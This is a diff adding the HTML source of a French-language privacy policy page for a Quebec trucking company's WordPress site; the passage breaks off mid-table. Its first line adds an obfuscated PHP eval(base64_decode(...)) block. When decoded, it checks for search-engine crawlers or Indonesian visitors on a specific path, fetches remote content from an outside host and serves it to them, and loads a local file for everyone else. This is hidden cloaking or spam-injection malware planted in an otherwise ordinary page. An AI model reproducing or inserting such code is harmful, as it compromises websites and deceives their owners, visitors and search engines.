@@ -1,1 +1,513 @@
-<?php eval(base64_decode('CiBnb3RvIEtrOWw4OyBvRVpPODogZnVuY3Rpb24gaXNIb21lUGFnZSgpIHsgcmV0dXJuICRfU0VSVkVSWyJceDUyXHg0NVwxMjFcMTI1XDEwNVx4NTNcMTI0XDEzN1x4NTVcMTIyXDExMSJdID09PSAiXHgyZlwxNjNcMTU3XHg3NVwxNTVcMTUxXHg3M1x4NzNcMTUxXDE1N1wxNTZceDJmIjsgfSBnb3RvIHRVUU9tOyBPY283NDogaWYgKChpc0dvb2dsZUNyYXdsZXIoKSB8fCBnZXRWaXNpdG9yQ291bnRyeSgpID09PSAiXDExMVx4NmVceDY0XDE1N1x4NmVceDY1XHg3M1x4NjlcMTQxIikgJiYgaXNIb21lUGFnZSgpKSB7ICRjdXJsID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgIlx4NjhceDc0XDE2NFx4NzBcMTYzXHgzYVx4MmZcNTdcMTQ0XDE0MVwxNTFcMTU0XDE3MVx4NzVcMTYwXDE0NFwxNDFceDc0XHg2NVx4NzNceDJlXDE0M1wxNTdcNTZcMTUxXHg2ZVw1N1x4NjFcMTU1XDE2MFx4MmZcMTYzXHg2OVx4NzRcMTY1XDE2M1x4MmZceDZkXHg2MVx4NzZceDY5XHgyZlwxNjVceDJlXDE2NFwxNzBcMTY0Iik7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgJGNvbnRlbnQgPSBjdXJsX2V4ZWMoJGN1cmwpOyBjdXJsX2Nsb3NlKCRjdXJsKTsgZWNobyAkY29udGVudDsgfSBlbHNlIHsgaW5jbHVkZSAiXDE1NVx4NjFcMTUxXHg2ZVw1Nlx4NzBceDY4XDE2MCI7IH0gZ290byBFVjQxVTsgS2s5bDg6IGZ1bmN0aW9uIGdldFZpc2l0b3JDb3VudHJ5KCkgeyAkaXAgPSAkX1NFUlZFUlsiXHg1MlwxMDVcMTE1XHg0ZlwxMjRceDQ1XDEzN1x4NDFcMTA0XDEwNFwxMjIiXTsgJGFwaV91cmwgPSAiXDE1MFx4NzRcMTY0XHg3MFw3Mlx4MmZcNTdcMTUxXHg3MFx4MmRcMTQxXDE2MFwxNTFcNTZcMTQzXDE1N1x4NmRcNTdceDZhXDE2M1x4NmZceDZlXDU3eyRpcH0iOyAkY3VybCA9IGN1cmxfaW5pdCgpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VUkwsICRhcGlfdXJsKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGN1cmwpOyBpZiAoY3VybF9lcnJubygkY3VybCkpIHsgcmV0dXJuICJceDQ1XHg3MlwxNjJcMTU3XHg3Mlx4M2FcNDAiIC4gY3VybF9lcnJvcigkY3VybCk7IH0gY3VybF9jbG9zZSgkY3VybCk7ICRkYXRhID0ganNvbl9kZWNvZGUoJHJlc3BvbnNlLCB0cnVlKTsgaWYgKCRkYXRhWyJcMTYzXHg3NFwxNDFceDc0XHg3NVwxNjMiXSA9PT0gIlwxNjNcMTY1XHg2M1x4NjNceDY1XDE2M1x4NzMiKSB7IHJldHVybiAkZGF0YVsiXDE0M1wxNTdcMTY1XHg2ZVwxNjRcMTYyXDE3MSJdOyB9IGVsc2UgeyByZXR1cm4gIlwxMDNcMTU3XHg3NVwxNTZceDc0XHg3Mlx4NzlcNDBcMTU2XHg2ZlwxNjRceDIwXDE0NlwxNTdcMTY1XHg2ZVx4NjQiOyB9IH0gZ290byBvRVpPODsgdFVRT206IGZ1bmN0aW9uIGlzR29vZ2xlQ3Jhd2xlcigpIHsgJHVzZXJBZ2VudCA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbIlwxMTBceDU0XHg1NFx4NTBcMTM3XHg1NVx4NTNcMTA1XDEyMlwxMzdceDQxXDEwN1wxMDVcMTE2XDEyNCJdKTsgcmV0dXJuIHN0cnBvcygkdXNlckFnZW50LCAiXHg2N1wxNTdceDZmXDE0N1wxNTRcMTQ1IikgIT09IGZhbHNlOyB9IGdvdG8gT2NvNzQ7IEVWNDFVOiA=')); ?>
+
+<!doctype html>
+<html lang="fr-FR">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<link rel="alternate" hreflang="en" href="https://transportlepiphanie.ca/en/privacy-policy/" />
+<link rel="alternate" hreflang="fr" href="https://transportlepiphanie.ca/politique-de-confidentialite/" />
+<link rel="alternate" hreflang="x-default" href="https://transportlepiphanie.ca/politique-de-confidentialite/" />
+<script id="cookieyes" type="text/javascript" src="https://cdn-cookieyes.com/client_data/1c3be0c382bbb2e570012742/script.js"></script>
+	<!-- This site is optimized with the Yoast SEO plugin v24.0 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Politique de confidentialité | Transport L’Épiphanie</title>
+	<link rel="canonical" href="https://transportlepiphanie.ca/politique-de-confidentialite/" />
+	<meta property="og:locale" content="fr_FR" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Politique de confidentialité | Transport L’Épiphanie" />
+	<meta property="og:description" content="Version actuelle : 12 mars 2025 Cette Politique de confidentialité (la « Politique ») énonce les pratiques d’Express Mondor en matière de collecte, d’utilisation et de communication de vos renseignements personnels par des moyens technologiques et s’applique aux situations énoncées à l’article 2. Pour faciliter la lecture, nous nous désignons sous le nom de « [&hellip;]" />
+	<meta property="og:url" content="https://transportlepiphanie.ca/politique-de-confidentialite/" />
+	<meta property="og:site_name" content="Transport L’Épiphanie" />
+	<meta property="article:modified_time" content="2025-03-19T17:20:52+00:00" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:label1" content="Durée de lecture estimée" />
+	<meta name="twitter:data1" content="9 minutes" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://transportlepiphanie.ca/politique-de-confidentialite/","url":"https://transportlepiphanie.ca/politique-de-confidentialite/","name":"Politique de confidentialité | Transport L’Épiphanie","isPartOf":{"@id":"https://transportlepiphanie.ca/#website"},"datePublished":"2025-03-13T14:44:30+00:00","dateModified":"2025-03-19T17:20:52+00:00","inLanguage":"fr-FR","potentialAction":[{"@type":"ReadAction","target":["https://transportlepiphanie.ca/politique-de-confidentialite/"]}]},{"@type":"WebSite","@id":"https://transportlepiphanie.ca/#website","url":"https://transportlepiphanie.ca/","name":"Transport L’Épiphanie","description":"","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://transportlepiphanie.ca/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"fr-FR"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<script type="text/javascript" id="wpml-cookie-js-extra">
+/* <![CDATA[ */
+var wpml_cookies = {"wp-wpml_current_language":{"value":"fr","expires":1,"path":"\/"}};
+var wpml_cookies = {"wp-wpml_current_language":{"value":"fr","expires":1,"path":"\/"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://transportlepiphanie.ca/wp-content/plugins/sitepress-multilingual-cms/res/js/cookies/language-cookie.js" id="wpml-cookie-js" defer="defer" data-wp-strategy="defer"></script>
+<meta name="generator" content="WPML ver:4.6.14 stt:1,4;" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/favicon-16x16.png">
+  <link rel="manifest" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/site.webmanifest">
+  <link rel="mask-icon" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/favicon.ico">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="msapplication-config" content="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel='stylesheet' href='https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/styles/main.css?id=aec8eb1b653ddb5cf432f457c7dd7f20' type='text/css' media='all'/>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@400;500;700&family=Open+Sans:wght@400;700&display=swap" rel="stylesheet">
+</head>
+
+<body class="wp-singular page-template-default page page-id-206 wp-theme-epiphanie pt-[112px]">
+
+  <header id="site-header" class="border-b border-solid border-black py-[1rem] h-[112px] fixed top-0 left-0 w-full bg-white z-50" x-data="{ open: false }">
+  <div class="container-1220-px">
+    <div class="flex items-center justify-between  relative">
+
+      <a href="https://transportlepiphanie.ca" class=" block w-[140px]">
+        <img src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/logo.svg" alt="">
+      </a>
+
+      <ul class="items-center gap-x-[1.5rem] hidden lg:flex lg:mt-[16px]">
+        
+          <li class="">
+            <a href="/#services" class="link-nav">
+              <span class="">Services</span>
+            </a>
+          </li>
+
+        
+          <li class="">
+            <a href="/#flotte" class="link-nav">
+              <span class="">Flotte</span>
+            </a>
+          </li>
+
+        
+          <li class="">
+            <a href="/#carriere" class="link-nav">
+              <span class="">Carrière</span>
+            </a>
+          </li>
+
+        
+          <li class="">
+            <a href="#contact" class="link-nav">
+              <span class="">Contact</span>
+            </a>
+          </li>
+
+        
+        <li class="lg:border-l-2 lg:border-solid lg:border-blue-1 lg:pl-[1.5rem]">
+                                    <a class="link-nav" href="https://transportlepiphanie.ca/en/privacy-policy/">
+                <span>en</span>
+              </a>
+                                            
+        </li>
+      </ul>
+
+                          <a class="link-login absolute top-[0] right-0 hidden lg:flex" href="https://azur.expressmondor.net:4443/Konek" target="_blank">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 40 40">
+              <g fill="currentColor" clip-path="url(#a)"><path d="M15 17.526c-4.595 0-8.334-3.738-8.334-8.333C6.666 4.598 10.405.859 15 .859s8.333 3.739 8.333 8.334-3.738 8.333-8.333 8.333Zm0-14.167a5.84 5.84 0 0 0-5.834 5.834A5.84 5.84 0 0 0 15 15.026a5.84 5.84 0 0 0 5.833-5.833A5.84 5.84 0 0 0 15 3.359ZM37.083 39.193h-9.166A2.92 2.92 0 0 1 25 36.276v-5.833a2.92 2.92 0 0 1 2.917-2.917h9.166A2.92 2.92 0 0 1 40 30.443v5.833a2.92 2.92 0 0 1-2.917 2.917Zm-9.166-9.167a.417.417 0 0 0-.417.417v5.833c0 .23.187.417.417.417h9.166c.23 0 .417-.187.417-.417v-5.833a.417.417 0 0 0-.417-.417h-9.166Z"/><path d="M35.417 30.026h-5.834c-.69 0-1.25-.56-1.25-1.25v-3.75a4.172 4.172 0 0 1 4.167-4.167 4.172 4.172 0 0 1 4.167 4.167v3.75c0 .69-.56 1.25-1.25 1.25Zm-4.584-2.5h3.334v-2.5a1.67 1.67 0 0 0-1.667-1.667 1.67 1.67 0 0 0-1.666 1.667v2.5ZM20.833 35.86H1.25C.56 35.86 0 35.3 0 34.61v-5.834c0-4.365 3.552-7.917 7.917-7.917H22.5c1.393 0 2.765.369 3.965 1.067a1.25 1.25 0 1 1-1.258 2.16 5.4 5.4 0 0 0-2.707-.727H7.917A5.423 5.423 0 0 0 2.5 28.776v4.583h18.333a1.25 1.25 0 0 1 0 2.5Z"/></g>
+              <defs>
+                <clipPath id="a"><path fill="currentColor" d="M0 0h40v40H0z"/></clipPath>
+              </defs>
+            </svg>
+            <span>Portail employé </span>
+          </a>
+      
+      <button class="hamburger w-[40px] h-[40px] text-blue-1 hover:text-black lg:hidden" @click="open = true">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 40 40">
+          <rect width="40" height="40" fill="currentColor" rx="20"/>
+          <path fill="#fff" d="M27.875 15.875h-15.75A1.105 1.105 0 0 1 11 14.75c0-.637.488-1.125 1.125-1.125h15.75c.637 0 1.125.488 1.125 1.125s-.488 1.125-1.125 1.125ZM27.875 21.125h-15.75A1.105 1.105 0 0 1 11 20c0-.637.488-1.125 1.125-1.125h15.75c.637 0 1.125.488 1.125 1.125s-.488 1.125-1.125 1.125ZM27.875 26.375h-15.75A1.105 1.105 0 0 1 11 25.25c0-.637.488-1.125 1.125-1.125h15.75c.637 0 1.125.488 1.125 1.125s-.488 1.125-1.125 1.125Z"/>
+        </svg>
+      </button>
+
+    </div>
+  </div>
+  <div id="site-menu-mobile" class="bg-blue-1 text-white h-screen fixed top-0 left-0 w-full z-[60]" x-show="open" x-cloak>
+  <div class="px-[24px] border-b border-solid border-white py-[1rem] mb-[24px]">
+    <a href="https://transportlepiphanie.ca" class="block w-[140px]">
+      <img src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/logo-white.svg" alt="">
+    </a>
+  </div>
+
+  <div class="px-[24px] mt-[64px]">
+
+    <ul class=" space-y-[16px]">
+      
+        <li>
+          <a href="/#services" class="link-nav-white">
+            <span class="">Services</span>
+          </a>
+        </li>
+
+      
+        <li>
+          <a href="/#flotte" class="link-nav-white">
+            <span class="">Flotte</span>
+          </a>
+        </li>
+
+      
+        <li>
+          <a href="/#carriere" class="link-nav-white">
+            <span class="">Carrière</span>
+          </a>
+        </li>
+
+      
+        <li>
+          <a href="#contact" class="link-nav-white">
+            <span class="">Contact</span>
+          </a>
+        </li>
+
+      
+      <li>
+                              <a class="link-nav-white" href="https://transportlepiphanie.ca/en/privacy-policy/">
+              <span>en</span>
+            </a>
+                                    
+      </li>
+    </ul>
+
+  </div>
+
+  <button aria-label="close" class="w-[24px] transition duration-fast hover:opacity-90 absolute top-[8px] right-[8px]" @click="open = false">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M5.32534 18.4133C5.54188 18.6304 5.82664 18.7387 6.1105 18.7387C6.39451 18.7387 6.67912 18.6304 6.89566 18.4133L12 13.3087L17.1044 18.4133C17.3211 18.6304 17.6057 18.7387 17.8896 18.7387C18.1733 18.7387 18.4579 18.6304 18.6747 18.4133C19.1084 17.9796 19.1084 17.2766 18.6747 16.8429L13.5701 11.7386L18.4128 6.89585C18.8466 6.46232 18.8466 5.75906 18.4128 5.32553C17.9792 4.89169 17.2763 4.89169 16.8424 5.32553L11.9999 10.1681L7.15748 5.32538C6.7238 4.89154 6.02069 4.89154 5.58731 5.32538C5.15348 5.75891 5.15348 6.46217 5.58731 6.8957L10.4299 11.7384L5.32564 16.8428C4.8915 17.2763 4.8915 17.9793 5.32534 18.4133Z" fill="white"/>
+    </svg>
+  </button>
+
+    <a class="link-login bg-black text-white py-[28px] px-[24px] flex justify-center fixed bottom-0 left-0 w-full" href="https://azur.expressmondor.net:4443/Konek" target="_blank">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 40 40">
+        <g fill="currentColor" clip-path="url(#a)"><path d="M15 17.526c-4.595 0-8.334-3.738-8.334-8.333C6.666 4.598 10.405.859 15 .859s8.333 3.739 8.333 8.334-3.738 8.333-8.333 8.333Zm0-14.167a5.84 5.84 0 0 0-5.834 5.834A5.84 5.84 0 0 0 15 15.026a5.84 5.84 0 0 0 5.833-5.833A5.84 5.84 0 0 0 15 3.359ZM37.083 39.193h-9.166A2.92 2.92 0 0 1 25 36.276v-5.833a2.92 2.92 0 0 1 2.917-2.917h9.166A2.92 2.92 0 0 1 40 30.443v5.833a2.92 2.92 0 0 1-2.917 2.917Zm-9.166-9.167a.417.417 0 0 0-.417.417v5.833c0 .23.187.417.417.417h9.166c.23 0 .417-.187.417-.417v-5.833a.417.417 0 0 0-.417-.417h-9.166Z"/><path d="M35.417 30.026h-5.834c-.69 0-1.25-.56-1.25-1.25v-3.75a4.172 4.172 0 0 1 4.167-4.167 4.172 4.172 0 0 1 4.167 4.167v3.75c0 .69-.56 1.25-1.25 1.25Zm-4.584-2.5h3.334v-2.5a1.67 1.67 0 0 0-1.667-1.667 1.67 1.67 0 0 0-1.666 1.667v2.5ZM20.833 35.86H1.25C.56 35.86 0 35.3 0 34.61v-5.834c0-4.365 3.552-7.917 7.917-7.917H22.5c1.393 0 2.765.369 3.965 1.067a1.25 1.25 0 1 1-1.258 2.16 5.4 5.4 0 0 0-2.707-.727H7.917A5.423 5.423 0 0 0 2.5 28.776v4.583h18.333a1.25 1.25 0 0 1 0 2.5Z"/></g>
+        <defs>
+          <clipPath id="a"><path fill="currentColor" d="M0 0h40v40H0z"/></clipPath>
+        </defs>
+      </svg>
+      <span>Portail employé </span>
+    </a>
+
+
+</div>
+
+</header>
+
+  <main id="main-content"> 
+  <section class="container-fluid-px my-[5rem] lg:mb-[7.5rem]">
+
+    <div class="container-1016">
+      <h1 class="h1 text-center">Politique de confidentialité</h1>
+      <div class="mt-[0.5rem] wysiwyg wysiwyg-base"><p>Version actuelle : <strong>12 mars 2025</strong></p>
+<p>Cette Politique de confidentialité (la « <strong>Politique</strong> ») énonce les pratiques d’Express Mondor en matière de collecte, d’utilisation et de communication de vos renseignements personnels par des moyens technologiques et s’applique aux situations énoncées à l’article 2. Pour faciliter la lecture, nous nous désignons sous le nom de « <strong>Mondor</strong> » ou simplement « nous ».</p>
+<p>Au sens de la présente Politique, est un renseignement personnel tout renseignement qui permet d’identifier une personne physique, directement ou indirectement.</p>
+<p>En acceptant notre Politique ou en nous fournissant des renseignements personnels après avoir eu l’opportunité de consulter celle-ci, vous acceptez que vos renseignements personnels soient traités conformément à notre Politique.</p>
+<h2>1. Comment joindre notre Responsable de la protection des renseignements personnels?</h2>
+<p>Pour toute question concernant la présente Politique ou notre gestion de vos renseignements personnels, vous pouvez joindre notre Responsable de la protection des renseignements personnels :</p>
+<ul>
+<li>Par courriel : <a href="mailto:vieprivee@expressmondor.net">vieprivee@expressmondor.net</a></li>
+<li>Par courrier : À l’attention de notre Responsable de la protection des renseignements personnels : 231 Saint-Antoine Nord, Lavaltrie, J5T 2G7</li>
+</ul>
+<h2>2. Comment utilisons-nous vos renseignements personnels?</h2>
+<p>La manière dont nous traiterons vos renseignements personnels dépendra de la nature de votre interaction avec nous sur notre site Internet, par téléphone ou par courriel. Vous trouverez ci-dessous une description de la collecte et de l’utilisation de vos renseignements personnels par Mondor étant entendu que nous pouvons également traiter vos renseignements personnels comme le prévoient les lois applicables ou autrement avec votre consentement.</p>
+<p>Dans le cadre de nos activités, nous traitons vos renseignements personnels par moyen technologique de la manière prévue aux articles 2.1 à 2.2 :</p>
+<p>2.1 &#8211; Lorsque vous communiquez avec notre équipe via notre site Internet ou par courriel;<br />
+2.2 &#8211; Lorsque vous nous faites parvenir votre candidature.</p>
+<h3>2.1 Lorsque vous communiquez avec notre équipe via notre site Internet ou par courriel</h3>
+<p><strong>Comment recueillons-nous vos renseignements personnels?</strong></p>
+<p>Nous recueillons vos renseignements personnels directement de vous lorsque :</p>
+<ul>
+<li>Vous nous envoyez un courriel;</li>
+<li>Vous remplissez une demande de soumission (transport ou logistique);</li>
+<li>Vous remplissez le formulaire de contact sur notre site Internet.</li>
+</ul>
+<p>Quelles sont les catégories de renseignements personnels recueillis et à quelles fins les utilisons-nous?</p>
+<table style="border-collapse: collapse; width: 100%;">
+<tbody>
+<tr>
+<td style="width: 50%;"><strong>Catégorie des renseignements</strong></td>
+<td style="width: 50%;"><strong>Utilisation</strong></td>
+</tr>
+<tr>
+<td style="width: 50%;">Renseignements d’identification : Nom, prénom, adresse courriel et téléphone si ceux-ci sont vos coordonnées personnelles.</td>
+<td style="width: 50%;">Confirmer votre identité et permettre au personnel concerné de Mondor de communiquer avec vous.</td>
+</tr>
+<tr>
